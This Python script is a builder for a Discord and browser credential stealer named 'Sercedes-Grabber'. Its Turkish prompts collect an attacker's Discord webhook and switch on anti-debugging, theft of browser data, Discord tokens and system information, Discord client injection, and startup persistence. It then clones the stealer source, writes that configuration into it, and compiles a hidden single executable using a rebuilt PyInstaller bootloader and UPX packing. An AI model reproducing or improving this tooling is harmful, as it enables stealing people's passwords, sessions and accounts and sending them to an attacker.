import json
import os
import shutil
import subprocess
import re
import requests
from InquirerPy import prompt # type: ignore


def get_config() -> dict:
    questions = [
        {
            "type": "input",
            "name": "webhook",
            "message": "Webhook Urlnizi Giriniz",
            "validate": (lambda x: False if re.match(r"https://(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
        },
        {
            "type": "confirm",
            "name": "antidebug",
            "message": "anti-debugging? Açılsın Mı?",
            "default": True,
        },
        {
            "type": "confirm",
            "name": "browsers",
            "message": "Tarayıcı Bilgileri Çalınsınmı ?",
            "default": True,
        },
        {
            "type": "confirm",
            "name": "discordtoken",
            "message": "Discord Token Bilgileri Çalınsınmı",
            "default": True,
        },
        {
            "type": "confirm",
            "name": "injection",
            "message": "Discord Değişen Bilgileri Geri Size Gelsinmi?",
            "default": True,
        },
        {
            "type": "confirm",
            "name": "startup",
            "message": "Başlangıçta Başlatılsın mı?",
            "default": True,
        },
        {
            "type": "confirm",
            "name": "systeminfo",
            "message": "Sistem Bilgileri Çalınsınmı?",
            "default": True,
        },
    ]

    return prompt(questions)

class make_env:
    def __init__(self) -> None:
        self.build_dir = os.path.join(os.getcwd(), 'build')

    def __call__(self) -> None:
        self.make_env()
        self.get_src()

    def make_env(self) -> None:
        if os.path.exists(self.build_dir):
            shutil.rmtree(self.build_dir)

        os.mkdir(self.build_dir)

    def get_src(self) -> None:
        subprocess.run(['git', 'clone', 'https://github.com/Sercedes001/Sercedes-Grabber.git'], cwd=self.build_dir)
        shutil.move(os.path.join(self.build_dir, 'Sercedes-Grabber', 'src'), self.build_dir)

class write_config:
    def __init__(self, config: dict) -> None:
        self.config = config
        self.build_dir = os.path.join(os.getcwd(), 'build')
        self.config_file = os.path.join(self.build_dir, 'src', 'config.py')

    def __call__(self) -> None:
        with open(self.config_file, 'w') as f:
            f.write(f'__CONFIG__ = {self.config}')

class build:
    def __init__(self) -> None:
        self.build_dir = os.path.join(os.getcwd(), 'build')
        self.dist_dir = os.path.join(self.build_dir, '..', 'dist')

    def __call__(self) -> None:
        self.get_pyinstaller()
        self.get_upx()

        subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--clean', '--distpath', self.dist_dir, '--workpath', os.path.join(self.build_dir, 'work'), '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx'), os.path.join(self.build_dir, 'src', 'main.py')])

    def get_pyinstaller(self) -> None:
        url = 'https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v5.1.zip'

        with requests.get(url, stream=True) as r:
            r.raise_for_status()
            with open(os.path.join(self.build_dir, 'pyinstaller.zip'), 'wb') as f:
                shutil.copyfileobj(r.raw, f)

        shutil.unpack_archive(os.path.join(self.build_dir, 'pyinstaller.zip'), self.build_dir)
        os.rename(os.path.join(self.build_dir, 'pyinstaller-5.1'), os.path.join(self.build_dir, 'pyinstaller'))
        os.remove(os.path.join(self.build_dir, 'pyinstaller.zip'))

        subprocess.run(['pip', 'uninstall', '-y', 'pyinstaller'], cwd=self.build_dir)
        subprocess.run(['py', '-3.10', './waf', 'all', '--target-arch=64bit'], cwd=os.path.join(self.build_dir, 'pyinstaller', 'bootloader'))
        subprocess.run(['py', '-3.10', 'setup.py', 'install'], cwd=os.path.join(self.build_dir, 'pyinstaller'))
    
    def get_upx(self) -> None:
        url = 'https://github.com/upx/upx/releases/download/v3.96/upx-3.96-win64.zip'

        with requests.get(url, stream=True) as r:
            r.raise_for_status()
            with open(os.path.join(self.build_dir, 'upx.zip'), 'wb') as f:
                shutil.copyfileobj(r.raw, f)

        shutil.unpack_archive(os.path.join(self.build_dir, 'upx.zip'), self.build_dir)
        os.rename(os.path.join(self.build_dir, 'upx-3.96-win64'), os.path.join(self.build_dir, 'upx'))
        os.remove(os.path.join(self.build_dir, 'upx.zip'))

def main() -> None:
    config = get_config()
    make_env()()
    write_config(config)()
    build()()

if __name__ == '__main__':
    main()
